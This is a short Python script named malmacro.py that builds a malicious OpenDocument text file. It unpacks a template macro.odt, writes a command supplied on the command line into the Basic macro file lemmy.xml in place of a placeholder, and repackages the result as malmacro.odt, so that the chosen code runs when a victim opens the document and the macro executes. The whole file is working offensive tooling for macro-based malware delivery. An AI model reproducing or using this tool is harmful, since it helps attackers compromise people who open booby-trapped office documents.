#!/usr/bin/env python3

import html
from zipfile import ZipFile
import shutil
import sys


def makeMacro():
    # Extract contents of ODT file
    with ZipFile("macro.odt", "r") as zObject:
        zObject.extractall(path="./temp")

    with open("./temp/Basic/Standard/lemmy.xml") as f:
        data = f.read()

    # Format of macro is HTML Entity, so let's convert the command to this format
    html_escaped = html.escape('\"' + sys.argv[1] + '\"')
    # Replace placeholder with macro command content
    macro_cmd = data.replace("SHELLHERE", html_escaped)

    # Overwrite XML file to include new macro command
    with open("./temp/Basic/Standard/lemmy.xml", "w") as f:
        f.write(macro_cmd)

    # Zip it all back up and rename it to malmacro.odt
    shutil.make_archive('malmacro.odt', 'zip', 'temp')
    shutil.move('malmacro.odt.zip', 'malmacro.odt')

    # Cleanup
    shutil.rmtree('temp')

def main():
    if len(sys.argv) != 2:
        print("Usage: malmacro.py <code_to_execute>")
        exit(1)
    else:
        makeMacro()
        exit(0)

if __name__ == '__main__':
    main()